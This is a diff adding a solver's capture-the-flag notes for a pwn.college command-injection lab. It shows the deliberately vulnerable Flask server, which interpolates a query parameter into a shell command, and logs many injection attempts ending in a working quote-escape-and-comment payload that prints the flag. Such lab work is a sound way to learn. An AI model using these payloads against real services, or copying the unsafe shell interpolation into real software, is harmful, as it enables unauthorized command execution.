@@ -1,0 +1,226 @@
+//executing the command in 'quotes'
+
+Terminal 1:
+
+
+hacker@web-security~cmdi-3:~$ cd /challenge/
+hacker@web-security~cmdi-3:/challenge$ ls
+DESCRIPTION.md  server
+hacker@web-security~cmdi-3:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/trial", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("path", "/challenge")
+    command = f"ls -l '{arg}'"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~cmdi-3:/challenge$ /challenge/server 
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+DEBUG: command="ls -l '/tmp' 'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:31:40] "GET /trial?path=/tmp'%20'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp' 'cat /flag''"
+127.0.0.1 - - [27/Sep/2026 15:32:44] "GET /trial?path=/tmp'%20'cat%20/flag' HTTP/1.1" 200 -
+DEBUG: command="ls -l ''; cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:34:21] "GET /trial?path=';%20cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp|'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:36:20] "GET /trial?path=/tmp|'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp|'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:36:51] "GET /trial?path=/tmp|'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp|'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:37:17] "GET /trial?path=/tmp|'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp|'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:38:05] "GET /trial?path=/tmp|'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp;cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:38:48] "GET /trial?path=/tmp;cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:39:08] "GET /trial?path=/tmp';cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp'|'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:39:22] "GET /trial?path=/tmp'|'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:40:24] "GET /trial?path=/tmp';'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:42:13] "GET /trial?path=/tmp';cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:43:44] "GET /trial?path=/tmp';'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';'cat /flag'"
+127.0.0.1 - - [27/Sep/2026 15:44:40] "GET /trial?path=/tmp';'cat%20/flag HTTP/1.1" 200 -
+DEBUG: command="ls -l '/tmp';cat /flag #'"
+127.0.0.1 - - [27/Sep/2026 15:44:42] "GET /trial?path=/tmp';cat%20/flag%20%23 HTTP/1.1" 200 -
+
+
+
+
+Terminal 2: Lot of trial and error for this one, using URL encoded # to make the quote into a comment 
+
+
+hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp|%27cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp|'cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%7C%27cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp|'cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%7C%27cat%20/flag"
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp|'cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp;cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp;cat /flag':</b><br>
+        <pre>ls: cannot access '/tmp;cat /flag': No such file or directory
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27;cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27|%27cat%20/fla
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp'|'cat /flag':</b><br>
+        <pre>/bin/sh: 1: cat /flag: not found
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27;%27cat%20/flag"
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';'cat /flag':</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+/bin/sh: 1: cat /flag: not found
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27;cat%20/fla
+g"
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';cat /flag':</b><br>
+        <pre>/bin/sh: 1: Syntax error: Unterminated quoted string
+</pre>
+        </body></html>
+hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27;%27cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';'cat /flag':</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+/bin/sh: 1: cat /flag: not found
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27;%27cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';'cat /flag':</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+/bin/sh: 1: cat /flag: not found
+</pre>
+        </body></html>
+        hacker@web-security~cmdi-3:/challenge$ curl "http://challenge.localhost/trial?path=/tmp%27%3Bcat%20/flag%20%23"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/trial"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l '/tmp';cat /flag #':</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+pwn.college{oWT0X23WQO3xJPOu5Hu8vOW95ZZ.QX2YTN2wCN2cDOxIzW}
+</pre>
+        </body></html>
+hacker@web-security~cmdi-3:/challenge$ 
+
+
+
+
+
+
+
+
+
+
